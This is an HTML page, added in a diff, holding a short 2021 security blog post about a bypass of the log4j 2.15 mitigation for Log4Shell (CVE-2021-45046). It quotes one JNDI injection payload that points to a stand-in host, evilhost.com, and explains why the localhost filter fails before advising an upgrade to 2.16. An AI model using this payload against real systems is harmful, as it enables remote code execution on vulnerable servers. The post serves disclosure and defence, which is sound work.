@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en-Us">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <title>Log4Shell part two &middot; Slices of a hacker&#39;s mind</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="/css/fonts">
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+		<link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Slices of a hacker&#39;s mind" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Slices of a hacker&#39;s mind</h2>
+				</a>
+				<ul>
+    <li><a href="/contact">About</a></li>
+    <li><a href="/flash">Flash Posts</a></li>
+    <li><a href="/post">Posts</a></li>
+    <li><a href="/search">Search</a></li>
+    <li><a href="/privacy">Privacy</a></li>
+</ul>
+
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        akendo
+        <span>on&nbsp;</span><time datetime="2021-12-18 10:21:09 &#43;0100 CET">December 18, 2021</time>
+        <br>
+        <span>1 minutes reading </span>
+         <span> posted in 
+    
+        <a href="https://blog.akendo.eu/categories/security/">Security</a>
+	
+    
+	
+    </span>
+    <span>
+    <br>
+    
+ 
+  with tags:
+   <a href="https://blog.akendo.eu/tags/java/">java</a> <a href="https://blog.akendo.eu/tags/100daystooffload/">100daystooffload</a></ul>
+
+
+
+</div>
+
+		<h1 class="post-title">Log4Shell part two</h1>
+<div class="post-line"></div>
+
+		
+
+		<p>I did not have much time to get to the log4j exploitation part. There are quite some interesting way to make use of the JDNI feature. Just <a href="https://www.lunasec.io/docs/blog/log4j-zero-day-severity-of-cve-2021-45046-increased/">yesterday</a>, another improvement of it has been discovered.</p>
+<p>With the version 2.15 of log4j, they changed the behavior of the lookup() function to be restricted. However, this can be bypassed.</p>
+<p>The bypass was posted yesterday morning by <a href="https://twitter.com/marcioalm/status/1471740771581652995">Márcio Almeida on Twitter</a>:</p>
+<pre><code>${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
+</code></pre>
+<p>He <a href="https://twitter.com/marcioalm/status/1471742744347348997">explains</a> how it works because while the <code>java.net.URI getHost()</code> resolves localhost, the <code>lookup()</code> function of log4j will still try to resolve the completed URL with the shebang. Hence, it still will try to connect to the evilhost. I think it is because the LDAP resolve effectively again and therefor bypass the localhost filter.</p>
+<p>This confirms the initial suspicion of the Luna sec guys. Besides of this, the mitigation does not only work, it also points to the core fact, that the vulnerability remains usable in the fix in scope of a corner-cases: When using the Thread Context Map. It is a feature for multithreading, I think, and there the mitigation does not work. The only solution is to update to 2.16 where the JDNI feature has been completely removed. Something that make more sense even now.</p>
+<p>best regards,<br>
+akendo</p>
+
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/post/2021-12-13-log4shell/" class="left arrow">&#8592;</a>
+		<a href="/post/2021-12-19-grep-binary/" class="right arrow">&#8594;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+
+</main>
+
+
+
+        		<footer>
+			
+			<span>
+			&copy; <time datetime="2023-05-02 07:01:30.201961273 &#43;0200 CEST m=&#43;0.161845813">2023</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
